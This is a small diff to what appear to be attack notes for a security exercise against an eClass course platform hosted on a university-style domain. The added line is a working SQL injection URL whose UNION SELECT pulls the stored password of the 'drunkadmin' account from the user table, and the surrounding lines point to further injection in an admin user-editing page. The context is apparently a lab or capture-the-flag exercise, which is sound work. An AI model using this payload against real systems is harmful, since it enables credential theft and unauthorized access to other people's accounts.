@@ -32,6 +32,8 @@ SQL Injection Attack
 
     	- Go to http://eponymous.csec.gr/modules/admin/edituser.php?u=1 and set for SQL Injection
 
+    	- http://eponymous.csec.gr/modules/course_info/archive_course.php?c=TMA101%27%20UNION%20SELECT%20password,1,2,password,4,5,6,7,8,9%20from%20eclass.user%20where%20username=%27drunkadmin%27--%20--
+
 	User Attack
 
 		- Go to math first, code exists in error:
